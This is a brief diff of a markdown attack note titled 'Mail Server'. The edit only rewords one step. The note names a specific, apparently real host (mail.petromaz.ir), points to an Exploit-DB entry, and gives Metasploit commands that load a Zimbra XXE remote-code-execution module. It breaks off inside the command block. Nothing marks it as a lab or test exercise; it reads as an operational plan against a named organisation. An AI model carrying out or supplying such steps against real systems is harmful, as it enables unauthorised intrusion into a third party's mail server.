@@ -1,7 +1,7 @@
 # Mail Server
 
 1. Address: `mail.petromaz.ir`
-2. Find Vuln: `https://www.exploit-db.com/exploits/46693`
+2. Find vulnerability: `https://www.exploit-db.com/exploits/46693`
 3. Run Metasploit `msfconsole -q`
 ```
 use exploit/linux/http/zimbra_xxe_rce
